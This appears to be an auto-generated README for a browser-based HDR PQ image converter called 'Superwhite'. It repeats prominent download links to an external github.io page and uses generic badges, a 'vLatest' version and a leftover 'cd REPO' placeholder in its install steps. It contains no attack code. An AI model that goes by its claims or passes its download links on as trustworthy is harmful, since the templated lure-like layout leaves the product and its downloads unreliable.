# Superwhite vLatest - HDR PQ Image Tool 2026

> **A browser-native HDR PQ image converter with processing that stays entirely on the client, built to push glow and brightness past white in the current web release.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliver-king1990/superwhite-browser-hdr-pq?style=flat-square)](https://github.com/oliver-king1990/superwhite-browser-hdr-pq)

---

<p align="center">
  <a href="https://oliver-king1990.github.io/superwhite-browser-hdr-pq/">
    <img src="https://img.shields.io/badge/Download-Superwhite%20Latest-brightgreen?style=for-the-badge" alt="Download Superwhite">
  </a>
</p>

> **[Direct Download - Superwhite vLatest](https://oliver-king1990.github.io/superwhite-browser-hdr-pq/)**

---

[Download Latest Build](https://oliver-king1990.github.io/superwhite-browser-hdr-pq/)

---

## What Superwhite Does

Superwhite is a web-based HDR PQ image utility that executes entirely in the browser. Its workflow centers on HDR PQ conversion and export, with all handling performed on the client so the app remains a self-contained HTML and browser delivery.

It is a fit for people who want a compact image conversion tool for Rec.2100-oriented output and emphasized highlight behavior. Since everything runs locally in the browser, it works well for quick trials, repeatable prep steps, and easy sharing without needing a desktop app.

---

## Key Capabilities

- Runs fully in the browser with client-side processing
- HDR PQ conversion workflow for images
- HDR PQ export support
- Glow and brightness boosting beyond normal white levels
- Image handling oriented around Rec.2100
- Web delivery through HTML
- No server-side processing in the main workflow
- Small-footprint setup for fast access and testing

---

## Installation

Clone the repository or download it, then open the HTML entry point in a modern browser.

```bash
git clone https://github.com/oliver-king1990/superwhite-browser-hdr-pq.git
cd REPO
```

From there, you can open the bundled HTML file directly in your browser, or run the folder through any local static file server if you want a local web host.

---

## How to Use

1. Open the Superwhite page in a browser.
2. Load the image you want to process.
3. Tune the HDR PQ and brightness-related controls as needed.
4. Export the result through the supported output flow.
5. Inspect the generated image in your HDR-capable viewing pipeline.

If you are doing simple local checks, opening the HTML file directly may work depending on your browser setup, though using a local server is often more practical for repeatable work.

---

## Configuration

Superwhite is built for the browser first, so the interface usually controls behavior instead of a separate config file.

If the source includes editable parameters, keep them in the HTML or script assets used by the web app. In normal use, settings are adjusted during the session through the on-page controls.

Example pattern:

```json
{
  "colorSpace": "Rec.2100",
  "processingMode": "client-side",
  "output": "HDR PQ"
}
```

---

## Requirements

- A modern web browser
- HTML support
- Sufficient local memory and CPU for browser-based image processing
- An HDR-capable workflow if you want to evaluate PQ output accurately
- A local static server is optional, but helpful for development and testing

---

## FAQ

**Does Superwhite run locally?**  
Yes. It is documented as fully client-side, so processing takes place in the browser.

**What is it designed for?**  
It is intended for HDR PQ image conversion and Rec.2100-related workflows.

**Is a backend required?**  
No backend is needed for the main use case. The app is delivered as a browser-based HTML tool.

**Where are settings changed?**  
Start with the browser interface controls. If you are working in source, configuration usually lives beside the HTML and script files.

**What if the page does not load correctly?**  
Try a current browser, or serve it from a local static server instead of opening it from a direct file path.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
